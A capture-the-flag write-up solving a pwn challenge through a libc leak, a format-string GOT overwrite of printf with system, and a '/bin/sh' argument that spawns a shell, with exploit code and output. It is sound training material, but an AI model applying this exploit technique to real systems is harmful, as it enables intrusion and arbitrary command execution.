# huge binary 1

- Category: pwn
- Difficulty: easy

"they say, 'sir, it's the biggest binary i've ever seen', 'it's the greatest binary ever made' - nobody's ever seen a bigger binary"

1825 bytes of `.text` and a single `main`. It hands over an arbitrary stack read and *two* format strings, with `No RELRO` — so the GOT is writable and the whole thing fits in one connection.

### Solution:

##### 1. Three gifts in one `main`

```asm
4011d4:  call   __isoc99_scanf        ; scanf("%d", &idx)   idx @ rbp-0xc
4011d9:  mov    eax,DWORD PTR [rbp-0xc]
4011dc:  cdqe
4011de:  mov    rax,QWORD PTR [rbp+rax*8-0x8]     ; <-- arbitrary stack read
4011f5:  call   printf                ; "Your lucky number is 0x%llx"
...
401227:  call   __isoc99_scanf        ; scanf("%127s", rbp-0x90)   buf1
401259:  call   __isoc99_scanf        ; scanf("%127s", rbp-0x110)  buf2
...
40127c:  call   printf                ; printf(buf1)   <-- format string #1
401290:  call   printf                ; printf(buf2)   <-- format string #2
```

`cdqe` sign-extends the index, and there is no bound of any kind, so `[rbp + idx*8 - 8]` reads any qword in the frame or above it. `idx = 2` is `[rbp+8]` — `main`'s saved return address, which points into libc.

Both `scanf("%127s")` calls happen *before* either `printf`, so by the time the first format string is interpreted the second buffer is already filled. `%s` stops at whitespace but not at NUL, so raw NUL bytes can be sent in either buffer — addresses need no encoding tricks.

##### 2. Pinning the return address inside libc

The shipped `libc.so.6` is Debian's glibc 2.41 and is stripped of `__libc_start_call_main`, but the call site is unmistakable — it is the only `call rax` followed by `mov edi,eax; call exit`:

```asm
29ca6:  call   rax
29ca8:  mov    edi,eax
29caa:  call   42360 <exit@@GLIBC_2.2.5>
```

So `main`'s return address is `libc_base + 0x29ca8`, and one read gives the base:

```python
tgt.sendlineafter(b'index: ', b'2')
leak = int(tgt.recvline().split(b'0x')[1].strip(), 16)
libc.address = leak - 0x29ca8
assert libc.address & 0xfff == 0
```

##### 3. Where the buffers land in `printf`'s argument list

At the `call printf`, `rsp` is `rbp-0x120`, so the first stack-passed vararg (`%6$`) is `[rbp-0x120]` and slot `N` is `[rbp-0x120 + (N-6)*8]`. That puts `buf2` (`rbp-0x110`) at `%8$` and `buf1` (`rbp-0x90`) at `%24$`. Confirmed rather than assumed:

```
$ echo 'ABCDEFGH%22$p.%23$p.%24$p' | ./hb1
Echoed output:
ABCDEFGH(nil).0x7f1fc022b000.0x4847464544434241
```

`0x4847464544434241` is `"ABCDEFGH"` — `buf1` starts at `%24$`, so a pointer placed at byte offset `k` of `buf1` is addressable as `%(24 + k/8)$`.

##### 4. Point `printf@GOT` at `system`, then let the program call it

`No RELRO` leaves `.got.plt` writable, and `printf` has already been called (the prompts), so `printf@GOT` at `0x403390` holds the resolved libc address. `printf` and `system` share their top two bytes, so only the low 4 bytes need changing — two `%hn` writes.

The pointers cannot go at the *start* of the format string (their NULs would terminate it), so they go at the end, 8-byte aligned, after the conversions that use them:

```python
payload = b"%<w1>c%<i1>$hn%<w2>c%<i2>$hn" + b'.'*pad + p64(0x403390) + p64(0x403392)
```

with `pad` chosen so the pointer block starts on a multiple of 8, and the two widths ordered by value so the second delta stays positive. The whole thing is ~48 bytes, well inside the 127-byte limit.

Then the second format string is simply the argument:

```python
tgt.sendlineafter(b'echoed: ', payload)
tgt.sendlineafter(b'echoed: ', b'/bin/sh')
```

`printf(buf1)` performs the GOT write; the very next instruction block calls `printf(buf2)`, which is now `system`, with `rdi` already pointing at `"/bin/sh"`. Stack alignment is whatever a normal call site provides, so there is nothing to fix up.

```
$ ./solve.py remote
[!] leak      0x7f2ad3629ca8  (ret site off 0x29ca8)
[!] libc base 0x7f2ad3600000
[!] system    0x7f2ad3650d70
PWNED
K17{it's_ab0v3_aver@ge_actua1ly}
```

Full script: [solve.py](solve.py)

**Flag:** `K17{it's_ab0v3_aver@ge_actua1ly}`

### Takeaways

- Two format strings in a row, with both buffers filled before either is printed, is strictly better than one: the first can write and the second supplies the argument for whatever the first redirected. No ROP, no stack pivot, no `pop rdi`.
- `scanf("%s")` will happily store NUL bytes — it only stops at whitespace. Payloads for `%s`-read buffers need no encoding, unlike `gets`/`fgets`-read ones.
- When a stripped libc hides the symbol you need for a return-address offset, the instruction pattern around the call site is usually unique enough to grep the disassembly for. `call rax` → `mov edi,eax` → `call exit` is `__libc_start_call_main` every time.
